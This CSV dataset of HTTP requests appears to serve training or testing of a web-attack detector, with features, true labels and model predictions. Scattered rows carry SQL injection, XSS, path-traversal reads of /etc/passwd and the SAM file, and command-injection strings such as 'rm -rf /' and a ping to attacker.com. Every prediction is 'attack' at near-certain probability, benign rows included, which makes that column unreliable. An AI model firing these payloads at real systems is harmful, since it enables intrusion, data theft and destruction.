Method,URL,content,content-type,Cookie,Length,User-Agent,classification,url_length,path_depth,query_length,param_count,content_length,content_numbers,content_special_chars,has_hex_encoding,has_base64,contains_special_chars,contains_sql_injection,contains_xss,contains_command_injection,Accept,cookie,predicted_class,attack_probability
1,/api/v1/resources/24,,1,2184,70,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/search?q=sTJKU,param1=srZwJWJM&param2=XCwOV,1,2205,337,1,0,15,1,7,1,28,2,3,0,0,0,0,0,1,0,,1,0.99993706
3,/products/70,,0,860,143,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
3,/products/26,param1=9uQrqUbu&param2=R1nRs,0,1854,438,3,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
2,/download?file=../../../etc/passwd,,1,1010,451,2,1,34,5,24,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
3,/products/39,,2,657,160,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/index.html,,0,1903,329,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/api/v1/resources/14,,0,1465,129,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/search?q=lE3kC,,0,435,125,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/search?q=Ym2zB,,0,1095,43,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/index.html,,0,2380,352,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/api/v1/resources/45,,1,691,299,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/products/82,param1=EbYZQyCH&param2=PthxI,0,1014,31,1,0,12,2,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999521
3,/api/v1/resources/3,,0,1728,234,3,0,19,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/api/v1/resources/12,param1=eW0poHe6&param2=WRonF,2,109,247,3,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
2,/products/36,,0,778,468,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
3,/index.html,,0,955,204,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/download?file=file:///etc/passwd,,0,1272,146,0,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/users/profile/VVo20is6,param1=Smtl90Pd&param2=c0l8Z,1,1603,472,3,0,23,3,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
1,/products/79,,0,344,367,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
0,/api/v1/resources/20,,0,702,460,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/users/profile/FEBuz0px,param1=sTSfP0gu&param2=LbwmM,2,1593,101,4,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,/index.html,,1,599,389,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/users/profile/rLZFxC8I,,2,1329,194,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/products/53,param1=a6jdn2ot&param2=5Dcaj,1,1053,480,1,0,12,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
2,/index.html,,1,106,240,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/products/64,param1=9rTpXm7Y&param2=2EJWw,2,368,425,1,0,12,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
3,/api/v1/resources/30,param1=n4Ag5UCf&param2=PdajC,0,1504,292,1,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
0,/page?id=<script>alert('XSS')</script>,comment=<img src='x' onerror='alert(1)'>,0,282,1689,5,1,38,2,32,1,40,1,11,0,0,1,0,1,0,0,,1,0.9999505
2,/products/9,param1=lkLdSJnX&param2=MVkMp,2,347,479,3,0,11,2,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999521
2,/search?q='; DROP TABLE users; --,username=admin' --,0,1915,1669,0,1,33,1,25,1,18,0,4,0,0,1,1,0,1,0,,1,0.99996066
3,/products/9,,1,719,294,1,0,11,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/search?q=KPGp0,,0,1932,380,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/api/v1/resources/32,param1=wIaW1NVc&param2=O4lx0,0,690,88,3,0,20,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
0,/execute?cmd=ping `ping -c 4 attacker.com`,command=ls & net user,1,1855,572,5,1,42,1,33,1,21,0,2,0,0,0,0,0,1,0,,1,0.9999573
3,/index.html,,0,506,265,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/users/profile/DQuSl4yf,param1=dsBBbdC3&param2=GJsoY,1,1069,11,1,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,"/page?id='""><script>alert(1)</script>",comment=<svg onload='alert(1)'>,0,1277,317,0,1,37,2,31,1,31,1,8,0,0,1,0,1,0,0,,1,0.9999505
2,/search?q=sNhFG,,0,96,480,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
1,/users/profile/W3tWKJL5,,0,2131,444,4,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,"/page?id='""><script>alert(1)</script>",comment=<script>alert('XSS')</script>,1,1190,942,2,1,37,2,31,1,37,0,10,0,0,1,0,1,0,0,,1,0.9999474
3,/search?q=Ka9o0,,2,822,72,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/products/65,param1=34JLHk38&param2=1f0ky,2,220,441,1,0,12,2,0,0,28,8,3,0,0,0,0,0,1,0,,1,0.9999521
1,/api/v1/resources/21,,1,2166,415,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/download?file=..\..\..\windows\system32\config\sam,,1,193,460,6,1,51,1,41,1,3,0,0,0,1,0,0,0,0,0,,1,0.9999305
0,/api/v1/resources/6,param1=lk54EuSk&param2=1EZlW,0,38,84,1,0,19,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
1,/search?q=mNF37,,1,279,451,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/api/v1/resources/12,param1=PzzZNPyk&param2=dFfFT,1,2249,346,4,0,20,4,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.99993515
1,/index.html,,1,794,468,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/index.html,,0,604,166,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/download?file=..\..\..\windows\system32\config\sam,,1,964,1245,5,1,51,1,41,1,3,0,0,0,1,0,0,0,0,0,,1,0.9999305
0,/users/profile/mzxv9OKn,param1=2RiS1gLN&param2=lYug0,1,84,388,3,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
0,/users/profile/yIByERvc,,2,1644,146,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/api/v1/resources/43,param1=zZP5OYol&param2=GuHb0,2,1595,309,1,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
2,/index.html,param1=TkEPzX5c&param2=bDyi9,1,1479,88,4,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
0,/products/43,,1,1686,19,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
0,/search?q=1' OR '1'='1,username=1' OR '1'='1,0,2316,122,7,1,22,1,14,1,21,3,6,0,0,1,0,0,0,0,,1,0.99996006
1,/index.html,param1=hoVYUUl4&param2=kiyKg,0,402,200,1,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
3,/search?q=sWjUv,param1=azKddkpi&param2=4PPvA,1,2188,262,1,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
1,/api/v1/resources/14,param1=noAbep7c&param2=erAsM,0,727,419,3,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
1,/users/profile/bK8ProcG,,1,527,158,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/search?q=3eFPn,,0,2129,92,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/api/v1/resources/3,param1=2QYLlvKh&param2=mfDOV,0,1943,447,4,0,19,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/api/v1/resources/38,,0,806,322,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/search?q=qFUbi,param1=lCTu2b75&param2=nTFTb,1,1448,374,1,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
2,/index.html,param1=lWYRsg0m&param2=a9AeA,1,893,188,3,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
2,/search?q='; DROP TABLE users; --,"username=' UNION SELECT username, password FROM users --",0,559,1356,2,1,33,1,25,1,56,0,5,0,0,1,1,0,1,0,,1,0.99996066
0,/search?q=CDd5e,param1=7Lgg5DT9&param2=DJtHy,0,313,492,1,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
1,/search?q=Ywk8C,,1,2211,443,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
3,/index.html,,1,1725,120,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/products/14,param1=bsanYSKi&param2=20XQV,1,1317,212,4,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
2,/index.html,param1=aUyE8le0&param2=XuZGg,0,1181,291,4,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
2,/users/profile/4kaQhckI,param1=1tm6q11g&param2=HVL9E,0,2266,211,3,0,23,3,0,0,28,7,3,0,0,0,0,0,1,0,,1,0.99993515
1,/search?q=urvzd,param1=sWXrbpvW&param2=o3bvv,0,2470,270,3,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
1,/products/81,,1,333,201,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/search?q=DeZXJ,,1,1558,268,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/api/v1/resources/20,,0,2274,17,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/users/profile/LIwDjTwE,param1=nEe0Wv3k&param2=wm1ny,2,2064,156,3,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
2,/search?q=' OR 1=1 --,username=admin' --,0,1552,556,7,1,21,1,13,1,18,0,4,0,0,1,0,0,0,0,,1,0.99995196
2,/search?q=1' OR '1'='1,username='; DROP TABLE users; --,1,771,1871,6,1,22,1,14,1,32,0,6,0,0,1,1,0,1,0,,1,0.99996305
0,/products/50,param1=ULcUXXpy&param2=lfEVH,0,1919,361,4,0,12,2,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999521
0,/products/84,,0,1237,213,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/index.html,param1=OWUpf0EU&param2=VwD5m,1,505,394,3,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
0,/execute?cmd=ping | cat /etc/passwd,command=ls | cat /etc/passwd,1,1714,764,0,1,35,3,26,1,28,0,4,0,0,0,0,0,1,0,,1,0.999956
1,/index.html,,0,1488,115,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/download?file=../../../etc/passwd,,1,2287,865,0,1,34,5,24,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/products/51,param1=poKGi8a7&param2=j3nk5,1,598,326,1,0,12,2,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.9999521
2,/search?q=h0bth,param1=eEpbcKDw&param2=Ua8Yb,2,705,123,4,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
0,/execute?cmd=ping ; rm -rf /,command=ls ; rm -rf /,1,1200,1112,6,1,28,2,19,1,21,0,4,0,0,1,0,0,1,0,,1,0.999956
2,/users/profile/ipd6V94x,param1=uFnh0Jcc&param2=DIWHA,0,2424,236,4,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,/users/profile/24YZb7Xx,param1=tOvkqnNb&param2=IkxxB,0,787,115,3,0,23,3,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.99993515
0,/execute?cmd=ping `ping -c 4 attacker.com`,command=ls || whoami,0,2296,345,7,1,42,1,33,1,20,0,3,0,0,0,0,0,1,0,,1,0.9999573
0,/api/v1/resources/42,param1=eGBVw7Wq&param2=yWGbP,1,841,225,4,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/products/19,param1=GCdqMIyx&param2=L7zRC,2,1630,471,3,0,12,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
0,/api/v1/resources/27,param1=0HPWhdin&param2=SLmIU,1,78,39,4,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
0,/search?q=xEjRm,,1,741,144,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/api/v1/resources/39,,0,2178,492,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/products/48,,0,1353,24,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/products/39,param1=l8A16n0U&param2=gY4A7,0,302,453,1,0,12,2,0,0,28,8,3,0,0,0,0,0,1,0,,1,0.9999521
2,/search?q=admin' --,username=' OR 1=1 --,1,791,1747,7,1,19,1,11,1,20,2,5,0,0,1,0,0,0,0,,1,0.9999436
3,/api/v1/resources/42,param1=ZPTO3kBG&param2=ifS6O,2,206,320,1,0,20,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
0,"/page?id='""><script>alert(1)</script>","comment='""><script>alert(1)</script>",1,1530,548,2,1,37,2,31,1,36,1,11,0,0,1,0,1,0,0,,1,0.9999505
2,/users/profile/8RWq7fJQ,,2,142,62,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/search?q=xrsgG,param1=0nDhQlpH&param2=b36F3,0,1934,220,1,0,15,1,7,1,28,6,3,0,0,0,0,0,1,0,,1,0.99993706
0,/products/100,,1,898,421,3,0,13,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/execute?cmd=ping & net user,command=ls ; rm -rf /,0,1273,153,6,1,28,1,19,2,21,0,4,0,0,1,0,0,1,0,,1,0.99994016
2,/api/v1/resources/20,param1=hSAxVtgn&param2=9nIPA,2,452,419,1,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
3,/search?q=t8OR0,param1=VeVIy86c&param2=nPEb9,0,2036,348,4,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
2,/products/8,param1=cU2fGoUu&param2=pWbxx,2,622,349,1,0,11,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
2,/index.html,param1=XgiE1yG8&param2=0FxOH,0,1066,169,1,0,11,1,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999485
2,/download?file=..\..\..\windows\system32\config\sam,,0,1665,882,7,1,51,1,41,1,3,0,0,0,1,0,0,0,0,0,,1,0.9999305
2,/products/26,param1=gxZ8Gsal&param2=pnfKd,1,520,119,3,0,12,2,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999521
2,/page?id=<img src='x' onerror='alert(1)'>,comment=<script>alert('XSS')</script>,0,914,131,7,1,41,1,35,1,37,0,10,0,0,1,0,1,0,0,,1,0.9999497
0,/execute?cmd=ping | cat /etc/passwd,command=ls ; rm -rf /,1,456,1044,5,1,35,3,26,1,21,0,4,0,0,1,0,0,1,0,,1,0.999956
3,/users/profile/tmRcdlrq,,1,647,33,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/search?q=b4sjr,,0,2114,442,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
0,/search?q=rag6R,param1=Ps5doLqk&param2=aAqIW,0,640,399,1,0,15,1,7,1,28,3,3,0,0,0,0,0,1,0,,1,0.99993706
3,/products/81,param1=Ggf28PMe&param2=uufbu,2,363,202,1,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
0,/download?file=file:///etc/passwd,,0,124,1810,2,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
3,/users/profile/e0r7wgiw,,0,1387,355,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/index.html,,1,64,151,4,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
0,/index.html,param1=WrSnwHYe&param2=V1zeG,1,526,322,4,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
2,/api/v1/resources/38,,2,1238,127,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/index.html,,1,740,91,3,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/users/profile/3iIC4gjT,param1=1jZjtOfr&param2=9B8Yo,0,536,173,1,0,23,3,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
2,/search?q=1; SELECT * FROM information_schema.tables,username=' OR 1=1 --,1,818,382,2,1,52,1,44,1,20,2,5,0,0,1,1,0,1,0,,1,0.99996626
0,/products/45,,0,2340,119,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/download?file=/var/www/html/config.php,,0,1907,541,0,1,39,5,29,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
2,/products/91,param1=11x2KDFI&param2=dSaNR,0,2236,500,1,0,12,2,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999521
0,/products/48,,0,2426,102,4,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/index.html,param1=9suMFgum&param2=QJ0Uv,1,66,392,3,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
0,/users/profile/hxoGs5Tu,,0,2040,119,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/search?q=MLVpm,param1=QIYcXXOx&param2=uutpS,1,372,339,1,0,15,1,7,1,28,2,3,0,0,0,0,0,1,0,,1,0.99993706
2,/download?file=/var/www/html/config.php,,1,916,857,6,1,39,5,29,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
1,/index.html,param1=X4ohwWne&param2=rTMQh,1,648,457,4,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
1,/search?q=XOPjk,,0,448,438,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/index.html,,0,1104,483,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
2,/api/v1/resources/14,,0,130,179,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/index.html,,2,1918,327,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
1,/users/profile/AFJ2qt97,param1=iibvmIsK&param2=UPtV3,2,723,369,1,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
2,/search?q=TeOqU,param1=Y2fy6Da8&param2=SgUN2,1,668,469,4,0,15,1,7,1,28,6,3,0,0,0,0,0,1,0,,1,0.99993706
1,/users/profile/rUzzrRy4,param1=vYteI8sm&param2=lOANP,0,2005,36,4,0,23,3,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
1,/search?q=fNdd2,,1,2183,366,1,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,"/search?q=' UNION SELECT username, password FROM users --","username=' UNION SELECT username, password FROM users --",1,117,1354,2,1,57,1,49,1,56,0,5,0,0,1,1,0,0,0,,1,0.99995565
0,/products/3,,2,1204,119,4,0,11,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
0,/index.html,,0,905,158,1,0,11,1,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.99990106
3,/api/v1/resources/36,,0,41,435,1,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/users/profile/g8BuMnRs,param1=0CaNaCYZ&param2=249qc,2,335,409,4,0,23,3,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
3,/api/v1/resources/4,param1=WQhMCcoV&param2=gKT74,0,2417,259,4,0,19,4,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.99993515
2,/search?q=1; SELECT * FROM information_schema.tables,username='; DROP TABLE users; --,1,735,1308,7,1,52,1,44,1,32,0,6,0,0,1,1,0,1,0,,1,0.99996305
0,/users/profile/AlcSoAdH,,2,972,184,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/products/60,param1=mGbrRwde&param2=Sztjl,2,1732,492,3,0,12,2,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999521
2,/api/v1/resources/48,param1=pHs4RFg3&param2=Us6n6,0,699,159,1,0,20,4,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
3,/search?q=qg4LW,param1=YittAMRM&param2=YLpjU,0,513,318,3,0,15,1,7,1,28,2,3,0,0,0,0,0,1,0,,1,0.99993706
3,/search?q=EgSHz,param1=79H1zYxC&param2=rnuWX,2,5,149,3,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
3,/api/v1/resources/39,,2,1373,113,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/api/v1/resources/6,param1=o5rC6iaR&param2=7tbnz,0,2224,142,3,0,19,4,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.99993515
0,/users/profile/nOiTiVDj,,0,2142,343,1,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/index.html,param1=QJDqw70y&param2=WWVyu,0,2047,188,1,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
1,/index.html,param1=JYKdhuqj&param2=BOZT0,1,383,375,4,0,11,1,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.9999485
3,/api/v1/resources/44,param1=yvJTu66I&param2=Uz5W7,1,2077,351,4,0,20,4,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.99993515
1,/search?q=0NDG5,param1=vTSfv0OF&param2=VjNv6,2,528,252,4,0,15,1,7,1,28,4,3,0,0,0,0,0,1,0,,1,0.99993706
0,/execute?cmd=ping `ping -c 4 attacker.com`,command=ls & net user,1,1694,1068,0,1,42,1,33,1,21,0,2,0,0,0,0,0,1,0,,1,0.9999573
0,/download?file=../../../etc/passwd,,0,324,1256,6,1,34,5,24,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/users/profile/iCo8Oote,param1=YmwNPEsr&param2=NIBGu,1,2161,390,3,0,23,3,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.99993515
3,/users/profile/wvnrU8dl,,2,711,97,3,0,23,3,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/api/v1/resources/12,,2,785,87,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
1,/api/v1/resources/43,,1,2373,34,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
2,/products/75,,1,1917,307,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
1,/search?q=hBeFS,param1=UvCjdtkK&param2=3f1Cc,0,1018,156,4,0,15,1,7,1,28,4,3,0,0,0,0,0,1,0,,1,0.99993706
1,/api/v1/resources/50,param1=64tQ2ij6&param2=TMO1B,0,1241,317,3,0,20,4,0,0,28,7,3,0,0,0,0,0,1,0,,1,0.99993515
1,/products/16,param1=WCtSZYLq&param2=moztA,1,1536,221,3,0,12,2,0,0,28,2,3,0,0,0,0,0,1,0,,1,0.9999521
3,/index.html,param1=axDi13Nd&param2=Q7tMq,2,890,197,3,0,11,1,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999485
0,/download?file=../../../etc/passwd,,0,2370,1886,5,1,34,5,24,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
0,/search?q=WXsTX,,2,1147,326,4,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/search?q=1' OR '1'='1,username=1' OR '1'='1,0,936,1017,2,1,22,1,14,1,21,3,6,0,0,1,0,0,0,0,,1,0.99996006
2,/execute?cmd=ping ; rm -rf /,command=ls `ping -c 4 attacker.com`,0,2132,588,5,1,28,2,19,1,35,1,5,0,0,1,0,0,1,0,,1,0.999964
0,/api/v1/resources/13,,0,1352,233,3,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
3,/products/14,param1=F2lIGU45&param2=A3ZlB,1,1126,115,1,0,12,2,0,0,28,6,3,0,0,0,0,0,1,0,,1,0.9999521
3,/index.html,param1=C3PN3CAu&param2=ZaQi2,2,1944,223,1,0,11,1,0,0,28,5,3,0,0,0,0,0,1,0,,1,0.9999485
1,/api/v1/resources/23,,0,1614,267,4,0,20,4,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.9998752
0,/search?q=ekhcg,param1=GG98VRQ4&param2=fdjNB,1,114,471,3,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
1,/search?q=gzb7z,param1=cOdsrR7O&param2=uzR3f,2,2487,22,4,0,15,1,7,1,28,4,3,0,0,0,0,0,1,0,,1,0.99993706
0,/execute?cmd=ping | cat /etc/passwd,command=ls & net user,1,2292,1443,0,1,35,3,26,1,21,0,2,0,0,0,0,0,1,0,,1,0.999956
0,/download?file=file:///etc/passwd,,0,1041,141,2,1,33,5,23,1,3,0,0,0,1,0,0,0,0,0,,1,0.99992836
2,/search?q=wOKQD,,0,1298,253,3,0,15,1,7,1,3,0,0,0,1,0,0,0,0,0,,1,0.999879
2,/index.html,param1=6GoiXg9A&param2=NJRcP,0,2233,404,4,0,11,1,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999485
0,"/search?q=' UNION SELECT username, password FROM users --",username=1; SELECT * FROM information_schema.tables,0,1428,781,5,1,57,1,49,1,51,1,5,0,0,1,1,0,1,0,,1,0.9999678
1,/products/24,param1=l9NUbkAX&param2=uQA9a,2,2265,407,3,0,12,2,0,0,28,4,3,0,0,0,0,0,1,0,,1,0.9999521
0,/search?q=admin' --,username=admin' --,0,1225,1225,7,1,19,1,11,1,18,0,4,0,0,1,0,0,0,0,,1,0.99993026
0,/products/63,,0,1845,404,1,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
3,/search?q=6rK5C,param1=xB6kw9nd&param2=6EMBc,1,509,30,4,0,15,1,7,1,28,5,3,0,0,0,0,0,1,0,,1,0.99993706
1,/products/58,,1,364,474,3,0,12,2,0,0,3,0,0,0,1,0,0,0,0,0,,1,0.999908
2,/api/v1/resources/50,param1=wuq5vDRc&param2=rxblo,1,1774,384,1,0,20,4,0,0,28,3,3,0,0,0,0,0,1,0,,1,0.99993515
